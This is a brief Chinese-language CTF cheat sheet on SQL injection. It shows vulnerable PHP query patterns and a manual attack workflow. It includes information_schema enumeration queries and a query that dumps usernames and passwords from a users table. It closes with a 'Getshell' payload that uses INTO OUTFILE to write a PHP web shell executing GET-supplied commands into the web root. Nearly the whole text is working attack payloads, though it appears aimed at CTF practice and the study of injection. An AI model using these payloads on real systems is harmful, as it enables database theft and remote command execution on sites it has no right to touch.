# SQL 注入场景提示

> 完整原理和 payload 见：[SQL 注入基础](../../01-CTF/web/sql注入原始/SQL注入基础.md)。

## 先判断闭合方式

```php
$sql = "SELECT * FROM users WHERE id='$id' LIMIT 1";
$sql = "SELECT * FROM users WHERE id=$id LIMIT 1";
$sql = "SELECT * FROM users WHERE id=('$id') LIMIT 1";
$sql = "SELECT * FROM users WHERE id=\"$id\" LIMIT 1";
$sql = "SELECT * FROM users WHERE username like '%$name%'";
```

## 手工流程

1. 单引号、双引号、括号和数字上下文测试。
2. 判断字段数和回显位。
3. 读取当前库、表、列和数据。
4. 无回显时使用报错、布尔或时间盲注。
5. 有文件权限时尝试写马。

```sql
SELECT group_concat(schema_name) FROM information_schema.schemata;
SELECT database();
SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema='db';
SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users';
SELECT group_concat(username,0x3a,password) FROM db.users;
```

## Getshell

```sql
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
```